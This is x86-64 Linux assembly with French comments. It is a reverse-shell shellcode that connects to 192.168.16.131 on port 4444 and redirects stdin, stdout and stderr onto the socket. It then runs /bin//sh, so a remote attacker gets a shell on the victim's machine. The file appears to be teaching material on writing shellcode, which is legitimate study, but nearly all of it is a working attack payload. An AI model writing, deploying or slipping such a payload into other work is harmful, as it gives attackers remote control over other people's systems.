section .data

section .text

global _start

_start:

        xor rax, rax
        xor rbx, rbx
        xor rcx, rcx
        xor rdx, rdx
        xor rdi, rdi
        xor rsi, rsi

        mov al, 41 	; RAX prends la valeur 41 (numéro du syscall SYS_SOCKET)
        mov dil, 2 	; RDI prends la valeur 2 pour le “domain” AF_INET (IPv4)
        mov sil, 1 	; RSI prends la valeur 1 pour le “socket type” SOCK_STREAM (socket de flux)
        mov dl, 6 	; RDX prends la valeur 6 pour le protocole utilisé = IPPROTO_TCP pour TCP.
        syscall 	; On execute la fonction socket() pour créer un socket :)
        mov r8, rax
        sub rsp, 8 			; On prépare un buffer de 8 octet sur la stack pour stocker la structure d'adresse
        mov BYTE[rsp],0x2 		; On place le domaine 2 (AF_INET) dans le premier octet du buffer
        mov WORD[rsp+0x2],0x5c11 	; On place le port 4444 en little-endian
        				; 4444 en héxa = 115c mais en assembleur on inverse tous les octets
        mov DWORD[rsp+0x4], 0x8310A8C0 	; Place l'adresse IP (192.168.16.131) en little-endian
        mov rsi, rsp 			; RSI prends une adresse vers une structure.

			; Ici la structure est sur la stack (RSP) donc RSI prends la valeur de l'adresse de RSP
        mov dl, 16 	; RDX prends la valeur 16 qui corresponds à la taille de la structure
        push r8 	; On push sur la stack la valeur du file descriptor du socket
        pop rdi 	; On la récupère dans le registre RDI. Ici, RDI = file descriptor du socket
        mov al, 42 	; RAX prends la valeur 42 (numéro du syscall SYS_CONNECT)
        syscall

        mov al, 33 	; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
        push r8 	; On push sur la stack la valeur du file descriptor du socket
        pop rdi 	; On la récupère dans le registre RDI. Ici, RDI = file descriptor du socket
        xor rsi, rsi 	; On XOR RSI avec lui même donc RSI = 0. Ici RSI = STDIN = 0
        syscall

        ; A la fin de ce syscall, ce qu'il vient de ce passer :
        ; le file descriptor STDIN de la victime a été dupliqué et il prend maintenant la valeur
        ; du file descriptor du socket. En d'autres termes, les entrées effectuées sur le serveur
        ; contrôlé par l'attaquant sont désormais interprétées comme des entrées
        ; faites par la victime sur son ordinateur compromis.

        mov al, 33  	; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
        push r8
        pop rdi
        mov sil, 1	; RSI prends la valeur 1 qui vaut STDOUT (sortie utilisateur)
        syscall
        mov al, 33 	; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
        push r8
        pop rdi
        mov sil, 2 	; RSI prends la valeur 2 qui vaut STDERR (affichage d'erreurs)
        syscall
        xor rsi, rsi 			; Efface RSI en le mettant à zéro
        push rsi 			; On push sur la stack un pointeur NULL pour les arguments de la fonction execve
        mov rdi, 0x68732f2f6e69622f   	; Charge l'adresse de la chaîne "/bin//sh" dans RDI.
        push rdi 			; On push sur la stack l'adresse de la chaîne "/bin//sh"
        push rsp 			; On push l'adresse actuelle de la stack (pointeur vers la chaîne "/bin//sh")
        pop rdi 			; RDI récupère l'adresse de la chaîne "/bin//sh"
        mov al, 59 	; RAX prends la valeur 59 (numéro du syscall SYS_EXECVE)
        cdq 		; Étend le signe de EAX vers EDX pour que RDX contienne 0
        		; Cela signifie qu'il n'y a pas d'arguments à passer à execve
        syscall 	; Appelle la fonction execve pour exécuter le shell "/bin//sh"
